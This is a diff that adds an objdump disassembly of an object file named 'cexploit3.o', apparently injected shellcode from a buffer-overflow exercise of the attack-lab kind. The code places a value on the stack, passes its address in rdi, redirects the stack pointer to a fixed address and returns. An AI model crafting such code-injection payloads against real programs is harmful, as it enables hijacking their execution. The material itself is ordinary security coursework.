@@ -1,0 +1,14 @@
+
+cexploit3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 84 24 00 ff ff 	movq   $0x4c92ae68,-0x100(%rsp)
+   7:	ff 68 ae 92 4c 
+   c:	48 8d bc 24 00 ff ff 	lea    -0x100(%rsp),%rdi
+  13:	ff 
+  14:	48 c7 c4 28 05 62 55 	mov    $0x55620528,%rsp
+  1b:	c3                   	retq   
+  1c:	f4                   	hlt    
